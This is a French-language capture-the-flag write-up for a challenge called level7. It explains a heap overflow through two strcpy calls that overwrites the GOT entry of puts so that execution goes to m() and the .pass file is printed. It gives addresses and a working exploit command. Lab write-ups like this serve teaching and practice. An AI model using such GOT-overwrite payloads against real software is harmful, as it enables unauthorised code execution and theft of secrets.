# level7 - GOT Overwrite via Heap Exploitation

## Analyse du Programme

**Structure Mémoire**
- 4 allocations `malloc(8)` successives
- Deux paires de blocs liés:
  - Premier bloc (`0x804a008`) pointe vers buffer1 (`0x804a018`)
  - Deuxième bloc (`0x804a028`) pointe vers buffer2 (`0x804a038`)
- Adresse GOT de `puts`: `0x08049928`
- Adresse de la fonction `m()`: `0x080484f4`

0xb7ea89f0

**Comportement**
- Le programme copie les arguments dans les buffers avec `strcpy()`
- Lecture du fichier `.pass` avec `fopen()` et `fgets()`
- Appel à `puts()` pour afficher un message

## Exploitation

**Stratégie**
- Utiliser le premier `strcpy()` pour écraser un pointeur avec l'adresse GOT de `puts`
- Utiliser le second `strcpy()` pour écrire l'adresse de `m()` dans la GOT
- Rediriger ainsi l'exécution de `puts()` vers `m()`

**Commande d'Exploitation**
```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

Le payload:
1. Premier argument: 20 bytes de padding + adresse GOT de `puts`
2. Second argument: adresse de la fonction `m()`

Cette exploitation redirige l'appel à `puts()` vers la fonction `m()`, permettant l'affichage du contenu du fichier `.pass`.
